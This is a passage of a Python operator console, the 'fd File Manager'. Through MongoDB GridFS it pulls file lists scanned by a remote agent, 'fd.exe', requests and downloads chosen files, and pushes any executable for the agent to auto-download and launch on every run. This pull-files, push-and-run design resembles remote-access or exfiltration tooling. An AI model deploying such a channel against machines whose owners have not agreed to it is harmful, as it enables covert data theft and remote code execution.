                        downloaded.add(fname)
                        console.print(f"  [bold green]>> Downloaded:[/bold green] [cyan]{fname}[/cyan] -> {local_path}")

                console.print(f"[dim]  Tick {tick}: {len(downloaded)}/{total} file(s) downloaded[/dim]")

                if len(downloaded) >= total:
                    break

    except KeyboardInterrupt:
        console.print("\n[yellow]  Polling stopped by user.[/yellow]")

    console.print(Rule())
    if downloaded:
        console.print(f"\n[bold green]DONE![/bold green] Downloaded [bold]{len(downloaded)}[/bold] file(s) to:")
        console.print(f"  [cyan]{DOWNLOAD_DIR}[/cyan]")
        for fname in sorted(downloaded):
            console.print(f"  [green]+[/green] {fname}")
    else:
        console.print("[yellow]  No files were downloaded. Check that fd.exe is still running and polling.[/yellow]")

# ─────────────────────────────────────────────────────────────────────────────
#  Upload companion app to GridFS
# ─────────────────────────────────────────────────────────────────────────────
def upload_companion_app(fs):
    """
    Let the user pick any .exe and upload it to GridFS as companion_app.exe.
    If the selected file has a different name it is automatically renamed during upload.
    Any previous version in GridFS is removed first.
    """
    import tkinter as tk
    from tkinter import filedialog

    console.print(Panel(
        f"Pick the companion app executable on your machine.\n"
        f"It will be stored in GridFS as [bold cyan]{COMPANION_APP_GRIDFS_NAME}[/bold cyan]\n"
        f"regardless of its current filename.\n\n"
        f"[dim]fd.exe will auto-download and launch it on every run.[/dim]",
        title="[bold cyan]Upload Companion App[/bold cyan]",
        border_style="cyan"
    ))

    # Open file picker
    tk_root = tk.Tk()
    tk_root.withdraw()
    tk_root.attributes("-topmost", True)
    file_path = filedialog.askopenfilename(
        title="Select Companion App Executable",
        filetypes=[("Executable files", "*.exe"), ("All files", "*.*")]
    )
    tk_root.destroy()

    if not file_path:
        console.print("[yellow]No file selected — upload cancelled.[/yellow]")
        return

    original_name = os.path.basename(file_path)
    file_size     = os.path.getsize(file_path)
    will_rename   = original_name.lower() != COMPANION_APP_GRIDFS_NAME.lower()

    console.print(f"\n[bold]Selected file:[/bold] [cyan]{file_path}[/cyan]")
    console.print(f"[bold]Size:[/bold] {file_size:,} bytes ({file_size / (1024*1024):.2f} MB)")
    if will_rename:
        console.print(
            f"[bold yellow]Rename:[/bold yellow] "
            f"[red]{original_name}[/red] → [green]{COMPANION_APP_GRIDFS_NAME}[/green]"
        )
    else:
        console.print(f"[dim]Filename already matches: {COMPANION_APP_GRIDFS_NAME}[/dim]")

    if not Confirm.ask(
        f"\n[bold yellow]?[/bold yellow] Upload as [cyan]{COMPANION_APP_GRIDFS_NAME}[/cyan]?",
        default=True
    ):
        console.print("[yellow]Upload cancelled.[/yellow]")
        return

    # Remove all existing GridFS versions first
    existing = list(fs.find({"filename": COMPANION_APP_GRIDFS_NAME}))
    if existing:
        console.print(f"[dim]>> Removing {len(existing)} existing version(s) from GridFS...[/dim]")
        for old in existing:
            try:
                fs.delete(old._id)
            except Exception as e:
                console.print(f"[yellow]  Warning — could not delete old version: {e}[/yellow]")

    # Upload new version with COMPANION_APP_GRIDFS_NAME as the GridFS filename
    console.print(f"[cyan]>> Uploading → GridFS as '{COMPANION_APP_GRIDFS_NAME}' ...[/cyan]")
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        transient=True
    ) as progress:
        progress.add_task(f"Uploading {COMPANION_APP_GRIDFS_NAME}", total=None)
        try:
            with open(file_path, "rb") as f:
                file_id = fs.put(
                    f,
                    filename=COMPANION_APP_GRIDFS_NAME,
                    metadata={
                        "originalName": original_name,
                        "uploadedBy":   "file_manager.py",
                        "uploadedAt":   datetime.now(timezone.utc).isoformat(),
                    }
                )
        except Exception as e:
            console.print(f"[bold red]X Upload failed:[/bold red] {e}")
            return

    console.print(Panel(
        f"[bold green]OK Upload successful![/bold green]\n\n"
        f"[bold]Stored as:[/bold]  [cyan]{COMPANION_APP_GRIDFS_NAME}[/cyan]\n"
        f"[bold]GridFS ID:[/bold]  {file_id}\n"
        f"[bold]Size:[/bold]       {file_size:,} bytes ({file_size / (1024*1024):.2f} MB)\n"
        + (f"[bold]Renamed:[/bold]    {original_name} → {COMPANION_APP_GRIDFS_NAME}\n"
           if will_rename else "")
        + f"\n[dim]fd.exe will pick this up and launch it automatically on next run.[/dim]",
        title="[bold green]Companion App Uploaded[/bold green]",
        border_style="green"
    ))


# ─────────────────────────────────────────────────────────────────────────────
#  Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    console.print(Panel(
        "[bold cyan]fd File Manager[/bold cyan]\n"
        "Fetch scan list → Search & Select files → Request upload → Auto-download",
        border_style="cyan",
        padding=(1, 4)
    ))

    # Connect
    client, db, fs = connect()

    # ── Startup menu ───────────────────────────────────────────────────────────────
    from rich.rule import Rule
    console.print(Rule("[bold]What would you like to do?[/bold]"))
    console.print("  [bold cyan]1[/bold cyan]  Browse scanned files & request upload (normal flow)")
    console.print("  [bold cyan]2[/bold cyan]  Upload / update companion app to cloud")
    console.print()
    choice = Prompt.ask(
        "[bold yellow]?[/bold yellow] Choose",
        choices=["1", "2"],
        default="1"
    )

    if choice == "2":
        upload_companion_app(fs)
        return

    # Step 1: Get latest scan file
    latest_scan = get_latest_scan_file(fs)
    local_scan = download_scan_file(fs, latest_scan)

    # Step 2: Load and select files
    paths = load_paths(local_scan)
    selected = gui_select(paths)

    # Step 3: Craft query + execute
    req_id = craft_and_execute(db, selected)

    # Step 4: Poll + download
    poll_and_download(db, fs, req_id, selected)

if __name__ == "__main__":
    main()
